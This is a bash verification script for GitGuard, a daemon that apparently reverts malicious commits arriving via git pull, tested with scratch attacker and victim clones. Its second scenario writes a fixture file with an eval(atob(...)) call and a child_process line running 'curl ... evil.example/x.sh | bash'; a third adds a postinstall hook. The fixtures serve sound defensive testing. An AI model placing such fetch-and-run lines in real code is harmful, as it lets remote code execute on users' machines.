#!/bin/bash
# Live end-to-end verification for GitGuard (needs the real installed root
# daemon — run `sudo ./install.sh` first if you haven't picked up GitGuard
# yet).
#
# Uses TWO clones against a scratch bare "upstream": an `attacker` clone
# that authors and pushes commits, and a `victim` clone that only ever
# `git pull`s — this is what mabured actually watches. (An earlier version
# of this script committed and pulled from the same clone, which is a
# no-op — nothing is ever "incoming" if you already have it locally. Fixed.)
#
# Commit signing is explicitly disabled for these scratch repos so a
# machine-wide GPG/SSH commit-signing setup (e.g. Secretive) can't make the
# setup commits fail silently.
set -euo pipefail

WORK=$(mktemp -d /tmp/gitguard-verify.XXXXXX)
UPSTREAM="$WORK/upstream.git"
ATTACKER="$WORK/attacker"
VICTIM="$WORK/victim"
trap 'echo; echo "(scratch dir kept at $WORK for inspection)"' EXIT

git_noSign() { git -c commit.gpgsign=false -c tag.gpgsign=false "$@"; }

echo "==> Setting up scratch repo at $WORK"
git init --bare -q -b main "$UPSTREAM"

git_noSign clone -q "$UPSTREAM" "$ATTACKER"
(cd "$ATTACKER" && git config user.name "attacker" && git config user.email "attacker@localhost" \
  && echo "hello" > README.md && git add README.md && git_noSign commit -qm "initial commit" \
  && git_noSign push -q origin main)

git_noSign clone -q "$UPSTREAM" "$VICTIM"
(cd "$VICTIM" && git config user.name "victim" && git config user.email "victim@localhost")

FULL_LOG="/Library/Logs/Mabure/events.full.jsonl"
PUBLIC_LOG="/Library/Logs/Mabure/events.jsonl"
CAN_READ_FULL=false
[[ -r "$FULL_LOG" ]] && CAN_READ_FULL=true

wait_for_log_line() {
  local grep_pattern="$1" timeout_s="$2" start
  start=$(date +%s)
  while true; do
    if grep -q "$grep_pattern" "$PUBLIC_LOG" 2>/dev/null; then return 0; fi
    if $CAN_READ_FULL && grep -q "$grep_pattern" "$FULL_LOG" 2>/dev/null; then return 0; fi
    if (( $(date +%s) - start > timeout_s )); then return 1; fi
    sleep 0.1
  done
}

echo
echo "=== Scenario 1: benign pull (should survive untouched) ==="
VICTIM_BEFORE=$(cd "$VICTIM" && git rev-parse HEAD)
(cd "$ATTACKER" && echo "benign update" >> README.md && git add README.md \
  && git_noSign commit -qm "benign update" && git_noSign push -q)
ATTACKER_HEAD=$(cd "$ATTACKER" && git rev-parse HEAD)
(cd "$VICTIM" && git pull -q)
sleep 1.5
VICTIM_AFTER=$(cd "$VICTIM" && git rev-parse HEAD)
if [[ "$VICTIM_AFTER" == "$ATTACKER_HEAD" ]]; then
  echo "PASS: benign content landed and is still present (not reverted)"
else
  echo "FAIL: victim HEAD=$VICTIM_AFTER, expected $ATTACKER_HEAD (benign pull's content is missing or wasn't pulled)"
fi

echo
echo "=== Scenario 2: malicious eval(atob(...)) pull (should be reverted fast) ==="
VICTIM_PRE=$(cd "$VICTIM" && git rev-parse HEAD)
(cd "$ATTACKER" && cat > malicious.js <<'EOF'
eval(atob("ZnVuY3Rpb24gbWFsaWNpb3VzKCl7fQ=="));
require('child_process').exec('curl -s https://evil.example/x.sh | bash');
EOF
  git add malicious.js && git_noSign commit -qm "add malicious.js" && git_noSign push -q)
(cd "$VICTIM" && git pull -q 2>&1 || true)
sleep 1.2
VICTIM_AFTER=$(cd "$VICTIM" && git rev-parse HEAD)
if [[ "$VICTIM_AFTER" == "$VICTIM_PRE" ]]; then
  echo "PASS: reverted back to pre-pull HEAD ($VICTIM_AFTER)"
else
  echo "FAIL: malicious content is still present at HEAD=$VICTIM_AFTER (expected $VICTIM_PRE)"
fi
if wait_for_log_line "git_block" 3; then
  echo "PASS: git_block event found in log"
else
  echo "FAIL: no git_block event found — check git_guard_enabled in config.json, and that the daemon actually restarted"
fi
ls /Library/Logs/Mabure/git-guard-backups/*.patch >/dev/null 2>&1 \
  && echo "PASS: a backup .patch file exists" \
  || echo "INFO: no readable backup patch found (dir is root-only 0700 — check with sudo if needed)"

echo
echo "=== Scenario 3: postinstall script pull (should be reverted) ==="
VICTIM_PRE=$(cd "$VICTIM" && git rev-parse HEAD)
(cd "$ATTACKER" && cat > package.json <<'EOF'
{
  "name": "victim-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node ./setup.js"
  }
}
EOF
  git add package.json && git_noSign commit -qm "add postinstall script" && git_noSign push -q)
(cd "$VICTIM" && git pull -q 2>&1 || true)
sleep 1.2
VICTIM_AFTER=$(cd "$VICTIM" && git rev-parse HEAD)
if [[ "$VICTIM_AFTER" == "$VICTIM_PRE" ]]; then
  echo "PASS: reverted back to pre-pull HEAD ($VICTIM_AFTER)"
else
  echo "FAIL: postinstall script is still present at HEAD=$VICTIM_AFTER (expected $VICTIM_PRE)"
fi

echo
echo "=== Scenario 4: git fetch alone (should be completely ignored) ==="
(cd "$ATTACKER" && echo "more" >> README.md && git add README.md \
  && git_noSign commit -qm "another change" && git_noSign push -q)
(cd "$VICTIM" && git fetch -q origin 2>&1 || true)
sleep 0.5
echo "INFO: check manually — no git_scan_clean/git_block entry for this fetch should appear in the log"

echo
echo "Done. Public log tail:"
tail -8 "$PUBLIC_LOG" 2>/dev/null || echo "(couldn't read $PUBLIC_LOG)"
